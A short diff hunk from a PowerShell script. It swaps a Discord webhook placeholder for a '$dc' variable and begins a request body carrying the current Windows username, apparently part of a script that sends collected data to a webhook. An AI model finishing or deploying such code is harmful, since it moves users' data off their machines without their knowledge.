@@ -7,7 +7,7 @@
         [string]$text 
     )
 
-    $hookurl = 'DISCORD-WEBHOOK'
+    $hookurl = '$dc'
 
     $Body = @{
       'username' = $env:username
